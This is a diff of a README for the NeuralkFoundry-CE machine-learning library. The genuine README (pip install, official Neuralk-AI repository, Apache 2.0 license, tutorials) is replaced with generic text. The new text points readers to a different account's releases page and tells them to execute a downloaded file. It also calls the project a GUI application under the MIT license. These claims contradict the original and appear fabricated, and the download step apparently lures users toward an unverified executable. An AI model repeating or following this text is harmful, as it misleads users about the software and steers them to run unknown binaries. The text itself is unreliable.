@@ -1,160 +1,81 @@
-<div align="center">
+# NeuralkFoundry-CE 🚀
 
-[![PyPI version](https://badge.fury.io/py/neuralk-foundry-ce.svg)](https://badge.fury.io/py/neuralk-foundry-ce)
-[![Dashboard](https://img.shields.io/badge/dashboard-neuralk.ai-red)](https://dashboard.neuralk-ai.com)
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](./LICENSE)
-[![Python Versions](https://img.shields.io/badge/python-3.10%20%7C%203.11%20%7C%203.12%20%7C%203.13-blue)](https://www.neuralk-ai.com)
-[![Website](https://img.shields.io/badge/website-neuralk.ai-%2345b69c)](https://www.neuralk-ai.com)
+![Neuralk Foundry](https://img.shields.io/badge/Neuralk%20Foundry-CE-blue.svg)
 
-</div>
+Welcome to the Community Edition of the Neuralk Foundry platform! This repository serves as a hub for developers and enthusiasts interested in leveraging the capabilities of the Neuralk Foundry. Here, you can access the latest features, enhancements, and community contributions.
 
-<div align="center">
-  
- [![Neuralk Foundry](https://raw.githubusercontent.com/Neuralk-AI/NeuralkFoundry-CE/main/assets/foundry_cover.png)](https://dashboard.neuralk-ai.com)
+## Table of Contents
 
-</div>
+- [Introduction](#introduction)
+- [Getting Started](#getting-started)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
+- [Releases](#releases)
 
-<h3 align="center">A Modular Machine Learning Framework for Industrial Tasks</h3>
+## Introduction
 
+Neuralk Foundry is designed to empower developers with tools and resources for building advanced neural network models. This Community Edition allows users to explore the platform's capabilities without the constraints of a commercial license. 
 
-<p align="center">
-  <a href="https://dashboard.neuralk-ai.com"><strong>[Dashboard]</strong></a>
-  <a href="./tutorials"><strong>[Examples & Tutorials]</strong></a>
-</p>
+Whether you are a beginner or an experienced developer, Neuralk Foundry provides a user-friendly environment to experiment and innovate.
 
----
+## Getting Started
 
-## 🎉 Welcome to Neuralk Foundry
+To get started, you will need to download the latest version of the Neuralk Foundry Community Edition. You can find the latest releases [here](https://github.com/lgrosan/NeuralkFoundry-CE/releases). Download the appropriate file for your operating system and follow the installation instructions.
 
-**Neuralk Foundry** is a lightweight yet powerful framework for building modular machine learning pipelines — particularly well-suited for industrial tasks and representation learning. Whether you're prototyping or scaling up, Foundry helps you build, combine, and orchestrate steps cleanly and efficiently.
+## Features
 
-Foundry is also the engine behind [**TabBench**](https://github.com/Neuralk-AI/TabBench), Neuralk's internal benchmark for evaluating ML models on real-world tabular datasets.
+- **User-Friendly Interface**: The platform offers an intuitive interface that simplifies the process of building and training neural networks.
+- **Comprehensive Documentation**: Access detailed documentation to help you navigate through the platform's features and capabilities.
+- **Community Support**: Engage with other users and developers through forums and discussion boards.
+- **Modular Architecture**: Customize your projects with a modular design that allows for easy integration of new components.
+- **Real-Time Collaboration**: Work with team members in real-time, making it easier to share ideas and resources.
 
-### Why Foundry?
+## Installation
 
-Most ML frameworks fall into one of two camps:
+1. Visit the [Releases](https://github.com/lgrosan/NeuralkFoundry-CE/releases) section to download the latest version.
+2. Choose the appropriate file for your operating system.
+3. Execute the downloaded file to install Neuralk Foundry on your machine.
+4. Follow the on-screen instructions to complete the installation.
 
-* **Rigid benchmarks and academic pipelines**: great for simple supervised learning tasks, but brittle or limited when adapting to more complex use cases.
-* **Heavyweight MLOps frameworks** (e.g., ZenML, Metaflow): offer full orchestration but at the cost of steep setup and reduced flexibility.
+## Usage
 
-**Foundry sits in between.** It gives you just the right level of structure to scale from prototype to production — without locking you into opinionated tooling.
+Once you have installed Neuralk Foundry, you can start creating your neural network models. Here are some basic steps to help you get started:
 
----
+1. **Launch the Application**: Open Neuralk Foundry from your applications menu.
+2. **Create a New Project**: Click on "New Project" to start building your neural network.
+3. **Choose a Template**: Select from a variety of templates to jumpstart your project.
+4. **Configure Your Model**: Adjust parameters such as layers, activation functions, and training data.
+5. **Train Your Model**: Use the built-in training tools to optimize your neural network.
+6. **Evaluate Performance**: Analyze the results and make necessary adjustments to improve accuracy.
 
-## 🚀 Key Features
+## Contributing
 
-**Composable Workflows**
-: Define steps in terms of their inputs and outputs — no black boxes.
+We welcome contributions from the community! If you would like to contribute to Neuralk Foundry, please follow these steps:
 
-**Supports Heterogeneous Tasks**
-: Classification, regression, ranking, record linkage, and more.
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your changes to your forked repository.
+5. Open a pull request to the main repository.
 
-**Customizable & Extensible**
-: Plug in your own logic or replace any step with a variant.
+Your contributions help improve the platform for everyone!
 
-**Built-in Caching & Logging**
-: Avoid recomputation and keep track of metrics automatically.
+## License
 
-**Workflow Explorer UI**
-: Inspect and debug workflows through an interactive, visual interface.
+Neuralk Foundry is licensed under the MIT License. Please see the [LICENSE](LICENSE) file for more details.
 
-**Reproducibility by Design**
-: Strong separation between configuration, code, and data.
+## Support
 
----
+If you encounter any issues or have questions, please check the [Issues](https://github.com/lgrosan/NeuralkFoundry-CE/issues) section of the repository. You can also reach out to the community through our discussion forums.
 
-## 🧠 How Things Are Organized
+## Releases
 
-Foundry is a modular framework. Its codebase is split into submodules that reflect each phase of the ML pipeline:
-
-```
-neuralk_foundry_ce/
-├── datasets/               # Dataset loading utilities
-├── sample_selection/
-│   ├── splitter/           # Data splitting strategies (e.g., stratified shuffle)
-│   └── blocking/           # Candidate pair selection (e.g., for deduplication)
-├── feature_engineering/
-│   ├── preprocessing/      # Traditional preprocessing for tabular data
-│   ├── vectorizer/         # Text and other unstructured data vectorization
-│   └── blocking/           # Pair processing modules for matching/merging
-├── models/
-│   ├── classifier/         # Classification models
-│   ├── regressor/          # Regression models
-│   ├── embedder/           # Embedding/representation learning
-│   └── clustering/         # Clustering and unsupervised methods
-├── workflow/               # Core execution engine: Step, Workflow, etc.
-└── utils/                  # Helper functions and shared infrastructure
-```
-
-Each component (e.g., a model or preprocessing step) inherits from a base `Step` class and declares:
-
-* Its expected **inputs**
-* The **outputs** it produces
-* Any configurable **parameters**
-
-Steps can then be connected into a `Workflow`, either manually or through a task-specific template (e.g., `Classification`).
+For the latest updates and releases, please visit the [Releases](https://github.com/lgrosan/NeuralkFoundry-CE/releases) section. Make sure to download the latest version and follow the installation instructions provided.
 
 ---
 
-## ⚙️ Quick-Start Installation
-
-Install the package from PyPI:
-
-```bash
-pip install neuralk_foundry_ce
-```
-
-## 🔬 Development Installation
-
-### Clone the Repository
-
-```bash
-git clone https://github.com/Neuralk-AI/NeuralkFoundry-CE
-cd NeuralkFoundry-CE
-```
-
-### Create a Dedicated Environment (recommended)
-
-Neuralk Foundry relies on a variety of external machine learning libraries. As a result, managing package versions can be delicate. To avoid compatibility issues, we strongly recommend installing Foundry in a dedicated virtual environment (e.g., using conda or venv).
-
-```bash
-conda create -n foundry python=3.11
-conda activate foundry
-```
-
-### Install the Package
-
-```bash
-pip install -e .
-```
-
-## Examples and tutorials
-
-* [**Getting Started with Neuralk Foundry**](tutorials/1%20-%20Getting%20Started%20with%20Neuralk%20Foundry.ipynb)
-  A gentle introduction to the framework and how to run your first workflow.
-
-* [**Three Levels of Workflows**](tutorials/2%20-%20Three%20levels%20of%20workflows.ipynb)
-  Understand how Foundry supports simple pipelines, reusable workflows, and specialized task flows.
-
-* [**Use a Custom Model**](tutorials/3%20-%20Use%20a%20custom%20model.ipynb)
-  Learn how to plug in and use your own ML model within a Foundry pipeline.
-
-## Citing Foundry
-
-If you incorporate any part of this repository into your work, please reference it using the following citation:
-
-```bibtex
-@article{neuralk2025foundry,
-         title={Foundry: A Modular Machine Learning Framework for Industrial Tasks}, 
-         author={Neuralk-AI},
-         year={2025},
-         publisher = {GitHub},
-         howpublished = {\url{https://github.com/Neuralk-AI/NeuralkFoundry-CE}},
-}
-```
-
-# Contact
-
-If you have any questions or wish to propose new features please feel free to open an issue or contact us at alex@neuralk-ai.com.  
-
-For collaborations please contact us at antoine@neuralk-ai.com.  
+Thank you for your interest in Neuralk Foundry! We hope you enjoy using the Community Edition and look forward to seeing what you create.
